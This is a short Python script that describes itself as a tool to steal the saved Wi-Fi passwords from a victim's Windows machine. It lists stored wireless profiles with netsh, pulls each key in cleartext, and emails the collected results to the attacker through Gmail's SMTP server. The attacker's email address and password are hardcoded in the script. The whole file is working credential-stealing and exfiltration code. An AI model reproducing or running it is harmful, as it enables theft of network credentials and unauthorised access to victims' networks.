# Program to find the passwords of wlan networks that the victim connected
# and send the results to attacker email address
import subprocess, smtplib, re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
# network_names=re.search("(?:profile\s*:\s)(.*)",networks)
network_names_list = re.findall("(?:profile\s*:\s)(.*)", networks)
# network_names_list.group(1)

results = ""

for network_name in network_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_results = subprocess.check_output(command, shell=True)
    results = results + current_results

send_mail("srikanthsri93096@gmail.com", "srikanth1434@", results)
